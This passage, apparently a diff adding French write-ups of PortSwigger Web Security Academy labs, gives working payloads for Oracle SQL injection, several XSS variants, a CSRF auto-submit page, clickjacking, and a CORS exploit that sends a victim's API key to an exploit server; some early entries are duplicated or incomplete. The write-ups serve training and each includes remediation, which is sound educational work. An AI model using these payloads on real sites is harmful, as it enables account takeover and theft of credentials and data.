+réponse, sans aucun encodage. Il suffit donc d’injecter directement une
+balise script dans le champ de recherche :</p>
+<div class="highlight"><pre><span></span><code>&lt;script&gt;alert()&lt;/script&gt;
+</code></pre></div>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-17-sql-injection-attack-querying-the-database-type-and-version-on-oracle">Lab 17 — SQL injection attack, querying the database type and version on Oracle<a class="headerlink" href="#lab-17-sql-injection-attack-querying-the-database-type-and-version-on-oracle" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> SQL Injection</p>
+<p>This lab contains a SQL injection vulnerability in the product category
+filter. You can use a UNION attack to retrieve the results from an
+injected query. To solve the lab, display the database version string.</p>
+<p><strong>Résolution :</strong></p>
+<p><strong>Étape 1 : Trouver le nombre de colonnes</strong></p>
+<p>Sur le paramètre vulnérable (généralement <code>category</code> dans l’URL, ex :
+<code>/``filter?category``=Gifts</code>), on teste avec <code>ORDER BY</code> :</p>
+<div class="highlight"><pre><span></span><code>' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+</code></pre></div>
+<p>On continue jusqu’à obtenir une erreur — le dernier numéro qui
+fonctionne sans erreur donne le nombre de colonnes (souvent 2 dans ce
+lab).</p>
+<p><strong>Étape 2 : Confirmer avec UNION SELECT NULL</strong></p>
+<div class="highlight"><pre><span></span><code>' UNION SELECT NULL,NULL FROM dual--
+</code></pre></div>
+<p>⚠️ Sur Oracle, contrairement à MySQL, on est <strong>obligé</strong> d’ajouter
+<code>FROM dual</code> (une table système vide qui sert de “table bidon” pour
+satisfaire la syntaxe SQL d’Oracle). Si ça ne renvoie pas d’erreur, on a
+le bon nombre de colonnes.</p>
+<p><strong>Étape 3 : Récupérer la version</strong></p>
+<p>On remplace un des <code>NULL</code> par la requête qui donne la version :</p>
+<div class="highlight"><pre><span></span><code>' UNION SELECT banner, NULL FROM v$version--
+</code></pre></div>
+<p><code>v$version</code> est une table système Oracle qui contient la chaîne de
+version complète de la base (nom + numéro de version).</p>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-18-basic-password-reset-poisoning">Lab 18 — Basic password reset poisoning<a class="headerlink" href="#lab-18-basic-password-reset-poisoning" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Authentication</p>
+<p>This lab is vulnerable to password reset poisoning. The user carlos will
+carelessly click on any links in emails that he receives. To solve the
+lab, log in to Carlos’s account.</p>
+<p><strong>Identifiants :</strong> <code>wiener:peter</code> — les emails envoyés à ce compte sont
+lisibles via le client email sur le serveur d’exploit.</p>
+<p><strong>Lab 19 Stored XSS into HTML context with nothing encoded</strong></p>
+<p>This lab contains a stored cross-site scripting vulnerability in the
+comment functionality.</p>
+<p>To solve this lab, submit a comment that calls the alert function when
+the blog post is viewed.</p>
+<p><img alt="Capture du lab résolu" src="media/image8.png" /></p>
+<p><strong>Lab: DOM XSS in document.write sink using source location.search</strong></p>
+<p>This lab contains a DOM-based cross-site scripting vulnerability in the
+search query tracking functionality. It uses the JavaScript
+document.write function, which writes data out to the page. The
+document.write function is called with data from location.search, which
+you can control using the website URL.</p>
+<p>To solve this lab, perform a cross-site scripting attack that calls the
+alert function.</p>
+<p><strong>Resolution : "&gt;<svg onload=alert(1)></strong></p>
+<p><strong>Lab: DOM XSS in innerHTML sink using source location.search</strong></p>
+<p>This lab contains a DOM-based cross-site scripting vulnerability in the
+search blog functionality. It uses an innerHTML assignment, which
+changes the HTML contents of a div element, using data from
+location.search.</p>
+<p>To solve this lab, perform a cross-site scripting attack that calls the
+alert function.</p>
+<p>Resolution: <img src=1 onerror=alert(1)></p>
+<p><strong>Lab: DOM XSS in jQuery anchor href attribute sink using
+location.search source</strong></p>
+<p>This lab contains a DOM-based cross-site scripting vulnerability in the
+submit feedback page. It uses the jQuery library's $ selector function
+to find an anchor element, and changes its href attribute using data
+from location.search.</p>
+<p>To solve this lab, make the "back" link alert document.cookie.</p>
+<p>https://0adf00fc0445233780ecdf9b0084001a.web-security-academy.net/feedback?returnPath=javascript:alert(1)</p>
+<p><strong>Lab: DOM XSS in jQuery selector sink using a hashchange event</strong></p>
+<p>This lab contains a DOM-based cross-site scripting vulnerability on the
+home page. It uses jQuery's $() selector function to auto-scroll to a
+given post, whose title is passed via the location.hash property.</p>
+<p>To solve the lab, deliver an exploit to the victim that calls the
+print() function in their browser.</p>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-19-csrf-vulnerability-with-no-defenses">Lab 19 — CSRF vulnerability with no defenses<a class="headerlink" href="#lab-19-csrf-vulnerability-with-no-defenses" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> CSRF (Cross-Site Request Forgery)</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab's email change functionality is vulnerable to CSRF.</p>
+<p>To solve the lab, craft some HTML that uses a CSRF attack to change
+the viewer's email address and upload it to the exploit server.</p>
+<p>Identifiants fournis : <code>wiener:peter</code>.</p>
+<p><strong>Contexte :</strong></p>
+<p>La fonctionnalité de changement d'email (<code>/my-account/change-email</code>)
+ne possède <strong>aucune protection CSRF</strong> : pas de token anti-CSRF dans le
+formulaire, pas de vérification des headers <code>Origin</code>/<code>Referer</code>, et le
+cookie de session n'a pas d'attribut <code>SameSite</code> restrictif. N'importe
+quel site tiers peut donc forger une requête qui sera exécutée avec la
+session de la victime, sans qu'elle s'en aperçoive.</p>
+<p>Requête légitime observée dans Burp (Proxy &gt; HTTP history) :</p>
+<div class="highlight"><pre><span></span><code>POST /my-account/change-email HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=...
+Content-Type: application/x-www-form-urlencoded
+
+email=test@test.com
+</code></pre></div>
+<p><strong>Résolution :</strong></p>
+<p>On construit une page HTML qui soumet automatiquement un formulaire
+vers l'endpoint vulnérable, avec l'email de notre choix :</p>
+<div class="highlight"><pre><span></span><code>&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST"&gt;
+      &lt;input type="hidden" name="email" value="attacker@evil.com" /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+      document.forms[0].submit();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
+<p>On héberge ce fichier sur le serveur d'exploit fourni par PortSwigger
+(<em>Go to exploit server</em>) :</p>
+<ul>
+<li><strong>File :</strong> <code>/exploit</code></li>
+<li><strong>Head :</strong> <code>HTTP/1.1 200 OK</code> / <code>Content-Type: text/html; charset=utf-8</code></li>
+<li><strong>Body :</strong> le HTML ci-dessus</li>
+</ul>
+<p>On clique <strong>Store</strong> pour l'enregistrer, puis <strong>Deliver exploit to
+victim</strong>. Le navigateur de la victime (authentifiée sur le lab) charge
+la page, le formulaire se soumet seul via le <code>&lt;script&gt;</code>, et le cookie
+de session est envoyé automatiquement par le navigateur puisque la
+requête vise le même domaine que le cookie — le CSRF n'a besoin de
+rien d'autre.</p>
+<p><strong>Pourquoi ça marche :</strong></p>
+<p>Le navigateur attache toujours les cookies d'un domaine aux requêtes
+qui lui sont destinées, même si la page qui déclenche la requête vient
+d'une origine totalement différente (ici le serveur d'exploit). Sans
+token CSRF ni <code>SameSite=Strict/Lax</code> sur le cookie de session, le
+serveur ne peut pas distinguer une requête volontaire de la victime
+d'une requête forgée par un tiers.</p>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Token CSRF unique par session, vérifié côté serveur sur chaque
+  requête de modification d'état.</li>
+<li>Cookie de session avec <code>SameSite=Lax</code> (ou <code>Strict</code>), qui empêche le
+  navigateur d'envoyer le cookie sur une requête cross-site de type
+  <code>POST</code>.</li>
+<li>Vérification du header <code>Origin</code> ou <code>Referer</code> en complément, jamais
+  comme seule protection (ces headers peuvent être absents ou
+  manipulés dans certains contextes).</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-20-basic-clickjacking-with-csrf-token-protection">Lab 20 — Basic clickjacking with CSRF token protection<a class="headerlink" href="#lab-20-basic-clickjacking-with-csrf-token-protection" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Clickjacking</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab is a sample Checkout page for an online store, vulnerable to
+clickjacking. There's also a reflected XSS vulnerability. However, you
+need to use a clickjacking attack to exploit this vulnerability.</p>
+<p>To solve the lab, construct an HTML page that frames the account page
+and fools the user into deleting their account, via a decoy website
+that they're induced to interact with. The lab is solved when the
+"My account" page deletion endpoint is triggered via the iframe.</p>
+<p><strong>Contexte :</strong></p>
+<p>Le site cible n'envoie pas de header <code>X-Frame-Options</code> ni de directive
+<code>Content-Security-Policy: frame-ancestors</code>, donc n'importe quelle page
+peut le charger dans un <code>&lt;iframe&gt;</code>. L'attaque consiste à superposer un
+élément visible et inoffensif (<code>&lt;div&gt;Click&lt;/div&gt;</code>) au-dessus de
+l'iframe, positionné exactement sur le bouton à piéger, tout en rendant
+l'iframe transparent (<code>opacity: 0.1</code>). La victime croit cliquer sur le
+<code>&lt;div&gt;</code>, mais c'est en réalité le clic sur le bouton du site ciblé qui
+est déclenché, avec sa propre session déjà authentifiée.</p>
+<p><strong>Résolution :</strong></p>
+<p>On commence par ouvrir le lab et repérer le bouton à piéger sur la page
+<code>/my-account</code> (ici, le bouton de suppression de compte). On inspecte la
+page pour estimer sa position approximative.</p>
+<p>Sur le serveur d'exploit (<em>Go to exploit server</em>), on crée la page
+suivante :</p>
+<div class="highlight"><pre><span></span><code>&lt;style&gt;
+    iframe {
+        position: relative;
+        width: 700px;
+        height: 600px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 500px;
+        left: 60px;
+        z-index: 1;
+    }
+&lt;/style&gt;
+&lt;div&gt;Click&lt;/div&gt;
+&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"&gt;&lt;/iframe&gt;
+</code></pre></div>
+<p>L'iframe charge la vraie page <code>/my-account</code> du lab (avec la session de
+la victime), rendue quasi invisible (<code>opacity: 0.1</code>). Le <code>&lt;div&gt;Click</code>
+est positionné par-dessus, aux coordonnées exactes du bouton de
+suppression de compte (ajustées par tâtonnement avec <code>top</code>/<code>left</code>).</p>
+<p>On clique <strong>Store</strong>, puis <strong>View exploit</strong> pour ajuster la position du
+<code>&lt;div&gt;</code> jusqu'à ce que le clic tombe pile sur le bouton réel (visible en
+augmentant temporairement l'opacité pour calibrer). Une fois la
+superposition correcte, on clique <strong>Deliver exploit to victim</strong> : le
+clic de la victime sur le <code>&lt;div&gt;</code> déclenche en réalité la suppression
+de son compte via l'iframe.</p>
+<p><strong>Pourquoi ça marche :</strong></p>
+<p>Le clickjacking détourne un clic légitime de l'utilisateur sans passer
+par une requête forgée : contrairement au CSRF, il n'a pas besoin de
+contourner un token anti-CSRF, puisque c'est le navigateur de la
+victime, avec sa session réelle, qui exécute l'action dans l'iframe. Le
+token CSRF est envoyé normalement, car c'est bien le formulaire
+légitime du site qui est soumis — seule l'interface visuelle est
+trompeuse.</p>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Header <code>X-Frame-Options: DENY</code> ou <code>SAMEORIGIN</code> pour empêcher le
+  framing.</li>
+<li><code>Content-Security-Policy: frame-ancestors 'none'</code> (ou liste blanche
+  des origines autorisées), qui remplace <code>X-Frame-Options</code> dans les
+  navigateurs modernes.</li>
+<li>Scripts de <em>frame-busting</em> côté client en défense complémentaire
+  (jamais comme seule protection, car contournables).</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-21-cors-vulnerability-with-basic-origin-reflection">Lab 21 — CORS vulnerability with basic origin reflection<a class="headerlink" href="#lab-21-cors-vulnerability-with-basic-origin-reflection" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> CORS (Cross-Origin Resource Sharing)</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab has an insecure CORS configuration in that it trusts all origins. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.</p>
+<p><strong>Identifiants :</strong> <code>wiener:peter</code></p>
+<p><strong>Contexte :</strong></p>
+<p>Le site expose un endpoint <code>/accountDetails</code> qui retourne des données sensibles (dont l'<code>apikey</code>) au format JSON, avec les headers suivants dans la réponse :</p>
+<div class="highlight"><pre><span></span><code>Access-Control-Allow-Origin: &lt;origin de la requête&gt;
+Access-Control-Allow-Credentials: true
+</code></pre></div>
+<p>Le serveur reflète aveuglément n'importe quelle origine dans <code>Access-Control-Allow-Origin</code>. Combiné à <code>Access-Control-Allow-Credentials: true</code>, cela permet à un site tiers de lire la réponse cross-origin avec les cookies de session de la victime — exposant ainsi des données privées.</p>
+<p><strong>Résolution :</strong></p>
+<p><strong>Étape 1 — Identifier le champ sensible</strong></p>
+<p>Se connecter avec <code>wiener:peter</code> et accéder à :</p>
+<div class="highlight"><pre><span></span><code>/accountDetails
+</code></pre></div>
+<p>La réponse JSON retourne :</p>
+<div class="highlight"><pre><span></span><code>{
+  "username": "wiener",
+  "email": "",
+  "apikey": "zPWeYW9yjHY1Auk4Okx2SeKlcaRCLkka",
+  "sessions": ["..."]
+}
+</code></pre></div>
+<p><strong>Étape 2 — Confirmer la vulnérabilité</strong></p>
+<p>Dans Burp Suite, ajouter le header <code>Origin: https://evil.com</code> à la requête vers <code>/accountDetails</code>. La réponse reflète :</p>
+<div class="highlight"><pre><span></span><code>Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+</code></pre></div>
+<p>→ Vulnérable ✅</p>
+<p><strong>Étape 3 — Payload sur le serveur d'exploit</strong></p>
+<p>Sur le serveur d'exploit, coller dans le body :</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">  </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"https://LAB-ID.web-security-academy.net/accountDetails"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s2">"include"</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">  </span><span class="p">})</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"https://EXPLOIT-SERVER.exploit-server.net/log?key="</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">apikey</span><span class="p">)</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">  </span><span class="p">})</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>⚠️ Le champ s'appelle <code>apikey</code> (tout en minuscules) — pas <code>apiKey</code>.</p>
+<p><strong>Étape 4 — Deliver to victim</strong></p>
+<p>Cliquer <strong>Deliver exploit to victim</strong>, puis consulter l'<strong>Access log</strong> du serveur d'exploit. Une requête de <code>10.0.4.x</code> (la victime) apparaît :</p>
+<div class="highlight"><pre><span></span><code>GET /log?key=OChRQPq4UqhmsHIvQtywQxHHPcwgCnzE HTTP/1.1
+</code></pre></div>
+<p><strong>Étape 5 — Soumettre la solution</strong></p>
+<p>Copier l'API key et la soumettre dans le lab → résolu ✅</p>
+<p><strong>Pourquoi ça marche :</strong></p>
+<p>Le navigateur attache automatiquement les cookies de session à la requête <code>fetch</code> grâce à <code>credentials: "include"</code>. Comme le serveur répond avec <code>Access-Control-Allow-Origin</code> égal à l'origine de l'exploit server et <code>Access-Control-Allow-Credentials: true</code>, le navigateur de la victime autorise le script à lire la réponse cross-origin — exposant l'<code>apikey</code> de l'admin.</p>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Ne jamais refléter aveuglément le header <code>Origin</code> reçu dans <code>Access-Control-Allow-Origin</code>.</li>
+<li>Maintenir une liste blanche stricte des origines autorisées.</li>
+<li>Éviter de combiner <code>Access-Control-Allow-Credentials: true</code> avec une politique CORS permissive.</li>
+<li>Ne jamais autoriser <code>Access-Control-Allow-Origin: *</code> avec des credentials.</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-22-stored-xss-into-html-context-with-nothing-encoded">Lab 22 — Stored XSS into HTML context with nothing encoded<a class="headerlink" href="#lab-22-stored-xss-into-html-context-with-nothing-encoded" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Cross-Site Scripting (XSS)</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the blog post is viewed.</p>
+<p><strong>Contexte :</strong></p>
+<p>Un XSS stocké (ou persistant) se produit lorsqu'une application enregistre une entrée utilisateur non filtrée dans sa base de données, puis la réaffiche telle quelle dans les pages. Contrairement au XSS réfléchi, la charge malveillante est exécutée automatiquement par tous les visiteurs qui consultent la page infectée — sans qu'ils aient besoin de cliquer sur un lien spécial.</p>
+<p><strong>Résolution :</strong></p>
+<p>On ouvre n'importe quel article de blog et on remplit le formulaire de commentaire. Dans le champ <strong>Comment</strong>, on injecte directement :</p>
+<div class="highlight"><pre><span></span><code>&lt;script&gt;alert()&lt;/script&gt;
+</code></pre></div>
+<p>Les autres champs (Name, Email, Website) peuvent contenir n'importe quelle valeur valide. On soumet le commentaire.</p>
+<p>Le site enregistre le commentaire sans aucun encodage ni filtrage. Dès qu'un utilisateur (ou nous-mêmes) consulte la page de l'article, le navigateur interprète la balise <code>&lt;script&gt;</code> et exécute <code>alert()</code> → lab résolu ✅</p>
+<p><strong>Pourquoi ça marche :</strong></p>
+<p>Le serveur stocke la valeur brute du champ et la réinjecte dans le HTML de la réponse sans l'encoder. Le navigateur interprète donc <code>&lt;script&gt;alert()&lt;/script&gt;</code> comme du code JavaScript légitime.</p>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Encoder toutes les sorties HTML (<code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, etc.) avant de les afficher.</li>
+<li>Valider et filtrer les entrées côté serveur.</li>
+<li>Mettre en place une <code>Content-Security-Policy</code> stricte qui bloque les scripts inline.</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-23-dom-xss-in-documentwrite-sink-using-source-locationsearch">Lab 23 — DOM XSS in document.write sink using source location.search<a class="headerlink" href="#lab-23-dom-xss-in-documentwrite-sink-using-source-locationsearch" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Cross-Site Scripting (XSS) — DOM-based</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript <code>document.write</code> function, which writes data out to the page. The <code>document.write</code> function is called with data from <code>location.search</code>, which you can control using the website URL.</p>
+<p>To solve this lab, perform a cross-site scripting attack that calls the alert function.</p>
+<p><strong>Contexte :</strong></p>
+<p>Un XSS DOM-based se produit entièrement côté client : le JavaScript de la page lit une source contrôlable (<code>location.search</code>, <code>location.hash</code>, etc.) et l'injecte dans un sink dangereux (<code>document.write</code>, <code>innerHTML</code>, etc.) sans assainissement. Le serveur ne voit jamais le payload — c'est le navigateur lui-même qui crée la vulnérabilité.</p>
+<p>Ici, le code de tracking ressemble à :</p>
+<div class="highlight"><pre><span></span><code>document.write('&lt;img src="/resources/images/tracker.gif?searchTerms=' + location.search + '"&gt;');
+</code></pre></div>
+<p><strong>Résolution :</strong></p>
+<p>Dans le champ de recherche, on injecte un payload qui ferme l'attribut <code>src</code> de la balise <code>&lt;img&gt;</code> générée par <code>document.write</code>, puis insère une balise SVG avec un handler <code>onload</code> :</p>
+<div class="highlight"><pre><span></span><code>"&gt;&lt;svg onload=alert(1)&gt;
+</code></pre></div>
+<p>Ce qui produit dans le DOM :</p>
+<div class="highlight"><pre><span></span><code>&lt;img src="/resources/images/tracker.gif?searchTerms="&gt;&lt;svg onload=alert(1)&gt;"&gt;
+</code></pre></div>
+<p>Le navigateur ferme la balise <code>&lt;img&gt;</code> au premier <code>"</code>, interprète <code>&lt;svg onload=alert(1)&gt;</code> comme une balise SVG valide et exécute <code>alert(1)</code> → lab résolu ✅</p>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Ne jamais utiliser <code>document.write</code> avec des données contrôlées par l'utilisateur.</li>
+<li>Encoder les données avant de les injecter dans le DOM.</li>
+<li>Préférer des méthodes sûres comme <code>textContent</code> au lieu de <code>innerHTML</code> ou <code>document.write</code>.</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-24-dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source">Lab 24 — DOM XSS in jQuery anchor href attribute sink using location.search source<a class="headerlink" href="#lab-24-dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Cross-Site Scripting (XSS) — DOM-based</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's <code>$</code> selector function to find an anchor element, and changes its <code>href</code> attribute using data from <code>location.search</code>. To solve this lab, make the "back" link alert <code>document.cookie</code>.</p>
+<p><strong>Contexte :</strong></p>
+<p>Le code jQuery de la page de feedback ressemble à :</p>
+<div class="highlight"><pre><span></span><code>$(function() {
+    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+});
+</code></pre></div>
+<p>Il prend le paramètre <code>returnPath</code> de l'URL et le place directement dans l'attribut <code>href</code> du lien "back". Si on passe <code>javascript:...</code> comme valeur, le navigateur exécutera ce code quand l'utilisateur cliquera sur le lien.</p>
+<p><strong>Résolution :</strong></p>
+<p>Accéder à la page de feedback avec le paramètre <code>returnPath</code> contenant un pseudo-protocole JavaScript :</p>
+<div class="highlight"><pre><span></span><code>/feedback?returnPath=javascript:alert(document.cookie)
+</code></pre></div>
+<p>Puis cliquer sur le lien <strong>"Back"</strong> de la page. Le navigateur interprète le <code>href</code> comme une URL <code>javascript:</code> et exécute <code>alert(document.cookie)</code> → lab résolu ✅</p>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Valider que les valeurs injectées dans des attributs <code>href</code> commencent par <code>http://</code> ou <code>https://</code>.</li>
+<li>Ne jamais autoriser les pseudo-protocoles <code>javascript:</code> ou <code>data:</code> dans des URLs contrôlées par l'utilisateur.</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-25-dom-xss-in-jquery-selector-sink-using-a-hashchange-event">Lab 25 — DOM XSS in jQuery selector sink using a hashchange event<a class="headerlink" href="#lab-25-dom-xss-in-jquery-selector-sink-using-a-hashchange-event" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Cross-Site Scripting (XSS) — DOM-based</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's <code>$()</code> selector function to auto-scroll to a given post, whose title is passed via the <code>location.hash</code> property. To solve the lab, deliver an exploit to the victim that calls the <code>print()</code> function in their browser.</p>
+<p><strong>Contexte :</strong></p>
+<p>Le code vulnérable ressemble à :</p>
+<div class="highlight"><pre><span></span><code>$(window).on('hashchange', function() {
+    var post = $('section.blog-list h2:contains(' + decodeURIComponent(location.hash.slice(1)) + ')');
+    post.get(0).scrollIntoView();
+});
+</code></pre></div>
+<p><code>$()</code> avec une chaîne contrôlée par l'utilisateur peut créer des éléments HTML si la chaîne ressemble à du HTML — c'est un sink dangereux dans les anciennes versions de jQuery.</p>
+<p><strong>Résolution :</strong></p>
+<p>On ne peut pas déclencher un <code>hashchange</code> depuis la même page (la victime ne va pas modifier l'URL manuellement). Il faut donc utiliser le <strong>serveur d'exploit</strong> pour envoyer un <code>&lt;iframe&gt;</code> qui charge la page cible et modifie le hash après chargement via <code>onload</code> :</p>
+<div class="highlight"><pre><span></span><code>&lt;iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;
+</code></pre></div>
+<p>Quand l'iframe charge, <code>onload</code> ajoute <code>&lt;img src=x onerror=print()&gt;</code> au hash. jQuery l'interprète comme un sélecteur HTML, crée l'élément <code>&lt;img&gt;</code>, tente de charger <code>src=x</code> (qui échoue), et déclenche <code>onerror=print()</code> → lab résolu ✅</p>
+<p><strong>Deliver to victim</strong> depuis l'exploit server pour valider.</p>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Mettre à jour jQuery vers une version récente (le comportement de <code>$()</code> avec du HTML a été restreint).</li>
+<li>Ne jamais passer <code>location.hash</code> ou <code>location.search</code> directement dans le sélecteur <code>$()</code>.</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-26-reflected-xss-into-attribute-with-angle-brackets-html-encoded">Lab 26 — Reflected XSS into attribute with angle brackets HTML-encoded<a class="headerlink" href="#lab-26-reflected-xss-into-attribute-with-angle-brackets-html-encoded" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Cross-Site Scripting (XSS)</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.</p>
+<p><strong>Contexte :</strong></p>
+<p>Le site encode les caractères <code>&lt;</code> et <code>&gt;</code> en <code>&amp;lt;</code> et <code>&amp;gt;</code>, ce qui empêche d'injecter des balises HTML. Cependant, la valeur de recherche est réinjectée à l'intérieur d'un attribut HTML existant, par exemple :</p>
+<div class="highlight"><pre><span></span><code>&lt;input type="text" value="VALEUR_RECHERCHE"&gt;
+</code></pre></div>
+<p>On n'a pas besoin de <code>&lt;&gt;</code> pour sortir de l'attribut — un simple <code>"</code> suffit à fermer la valeur, puis on ajoute un nouvel attribut directement.</p>
+<p><strong>Résolution :</strong></p>
+<p>Dans le champ de recherche, injecter :</p>
+<div class="highlight"><pre><span></span><code>" onmouseover="alert(1)
+</code></pre></div>
+<p>Ce qui produit dans le HTML :</p>
+<div class="highlight"><pre><span></span><code>&lt;input type="text" value="" onmouseover="alert(1)"&gt;
+</code></pre></div>
+<p>Il suffit de passer la souris sur le champ de recherche pour déclencher <code>alert(1)</code> → lab résolu ✅</p>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Encoder les guillemets (<code>"</code> → <code>&amp;quot;</code>) dans les valeurs d'attributs HTML.</li>
+<li>Utiliser des guillemets pour délimiter tous les attributs (pas de valeurs non quotées).</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-27-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded">Lab 27 — Stored XSS into anchor href attribute with double quotes HTML-encoded<a class="headerlink" href="#lab-27-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Cross-Site Scripting (XSS)</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.</p>
+<p><strong>Contexte :</strong></p>
+<p>Dans le formulaire de commentaire, le champ <strong>Website</strong> est injecté dans l'attribut <code>href</code> du lien auteur :</p>
+<div class="highlight"><pre><span></span><code>&lt;a href="VALEUR_WEBSITE"&gt;Nom auteur&lt;/a&gt;
+</code></pre></div>
+<p>Les guillemets doubles <code>"</code> sont encodés, donc on ne peut pas sortir de l'attribut de cette façon. Mais le navigateur accepte les pseudo-protocoles comme <code>javascript:</code> directement dans un <code>href</code> — aucun <code>&lt;&gt;</code> ni <code>"</code> n'est nécessaire.</p>
+<p><strong>Résolution :</strong></p>
+<p>Dans le champ <strong>Website</strong> du formulaire de commentaire, entrer :</p>
+<div class="highlight"><pre><span></span><code>javascript:alert(1)
+</code></pre></div>
+<p>Le site stocke cette valeur et l'injecte dans le <code>href</code> du nom d'auteur :</p>
+<div class="highlight"><pre><span></span><code>&lt;a href="javascript:alert(1)"&gt;Nom auteur&lt;/a&gt;
+</code></pre></div>
+<p>Quand un visiteur clique sur le nom de l'auteur du commentaire, <code>alert(1)</code> s'exécute → lab résolu ✅</p>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Valider que les URLs soumises dans le champ Website commencent par <code>http://</code> ou <code>https://</code>.</li>
